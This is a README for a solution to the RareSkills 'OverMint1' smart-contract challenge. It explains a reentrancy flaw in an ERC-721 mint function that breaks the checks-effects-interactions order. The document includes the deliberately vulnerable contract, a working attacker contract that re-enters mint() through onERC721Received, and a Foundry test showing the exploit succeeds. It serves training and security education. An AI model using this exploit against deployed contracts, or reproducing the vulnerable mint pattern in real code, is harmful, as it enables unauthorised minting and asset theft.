# OverMint1 Challenge

This repository contains my solution to the RareSkills "OverMint1" challenge, focusing on NFT security vulnerabilities.

## The Challenge

The challenge involves identifying and exploiting a vulnerability in an ERC-721 implementation that allows users to mint more NFTs than they should be allowed to.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    // @audit-issue CEI is not respected! Risk of reentrancy!
    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}
```

## The Vulnerability

The vulnerability stems from the contract not following the Checks-Effects-Interactions (CEI) pattern. The contract checks `amountMinted[msg.sender]` but then performs an external interaction via `_safeMint()` before updating the `amountMinted` counter. 

Since `_safeMint()` can trigger a callback to the receiving contract via `onERC721Received()`, this creates a reentrancy opportunity that allows bypassing the intended limit of 3 NFTs per address. The vulnerable sequence is:

1. Check: `require(amountMinted[msg.sender] <= 3, "max 3 NFTs");`
2. Interaction: `_safeMint(msg.sender, totalSupply);` (external call happens here)
3. Effect: `amountMinted[msg.sender]++;` (state update happens too late)

The proper CEI pattern would perform all state updates before the external call.

## My Solution

I implemented a solution by creating an attacker contract that exploits the reentrancy vulnerability:

```solidity
contract PwnOvermint1 is IERC721Receiver {
    Overmint1 overmint;
    address i_owner;

    constructor(address _overmint) {
        i_owner = msg.sender;
        overmint = Overmint1(_overmint);
    }

    function attack() public {
        require(
            msg.sender == i_owner,
            "Only the owner can call this function!"
        );
        overmint.mint();
    }

    function normalMint() public {
        require(
            msg.sender == i_owner,
            "Only the owner can call this function!"
        );
        overmint.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        require(
            msg.sender == address(overmint),
            "Must come from overmint contract!"
        );
        if (overmint.balanceOf(address(this)) < 5) {
            overmint.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

I also wrote a Foundry test to verify my solution works correctly:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import {Overmint1, PwnOvermint1} from "../src/Overmint1.sol";
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "forge-std/console.sol";

contract Overmint1Test is Test {
    Overmint1 overmint;
    PwnOvermint1 pwnovermint;

    address DEPLOYER;
    address ATTACKER;

    function setUp() public {
        DEPLOYER = makeAddr("deployer");
        ATTACKER = makeAddr("attacker");

        vm.prank(DEPLOYER);
        overmint = new Overmint1();
        vm.prank(ATTACKER);
        pwnovermint = new PwnOvermint1(address(overmint));
    }

    function testSetUp() public {
        console.log(
            "Both the Overmint and the Attacker contract have successfully been set up!"
        );
        console.log("");
        console.log("The Overmint contract is at: ", address(overmint));
        console.log("The Attacker contract is at: ", address(pwnovermint));
    }

    function testAttack() public {
        uint256 initialBalance = overmint.balanceOf(address(pwnovermint));
        console.log(
            "Before the attack, the attacker address has a balance of %s NFT's",
            initialBalance
        );
        vm.prank(ATTACKER);
        pwnovermint.attack();
        uint256 newBalance = overmint.balanceOf(address(pwnovermint));
        console.log(
            "After the attack, the attacker address has a balance of %s NFT's",
            newBalance
        );
        bool balanceOfAttacker = overmint.success(address(pwnovermint));
        assertTrue(balanceOfAttacker);
    }
}
```

## Testing

I've written a complete Foundry test suite to verify my solution:

```bash
forge test -vv --match-test testAttack
```

The test validates that the attack successfully mints 5 NFTs, satisfying the `success()` function's requirement. Running the test shows the balance changing from 0 to 5 NFTs after executing the attack.

## Security Insights

This challenge demonstrates important security considerations for NFT implementations:

1. The critical importance of following the Checks-Effects-Interactions pattern
2. Reentrancy vulnerabilities that can exist in NFT mint functions
3. How `_safeMint()` creates callback opportunities via `onERC721Received()`
4. Why state-changing operations should complete before external calls

## Acknowledgements

This challenge is part of the RareSkills solidity training material on ERC-721 security issues.